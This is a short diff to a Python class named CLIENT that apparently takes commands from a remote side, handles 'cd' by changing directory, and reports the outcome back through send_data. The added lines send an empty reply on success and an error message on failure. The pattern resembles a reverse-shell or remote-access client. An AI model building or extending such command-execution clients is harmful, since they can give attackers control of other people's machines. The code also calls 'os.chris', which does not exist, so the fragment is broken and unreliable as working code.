@@ -65,3 +65,7 @@ class CLIENT:
                 if toexecute.split(" ")[0] == "cd":
                     try:
                         os.chris(toexecute.split(" ")[1])
+                        self.send_data("")
+                    except:
+                        self.send_data("Error while changing directory!")
+                        
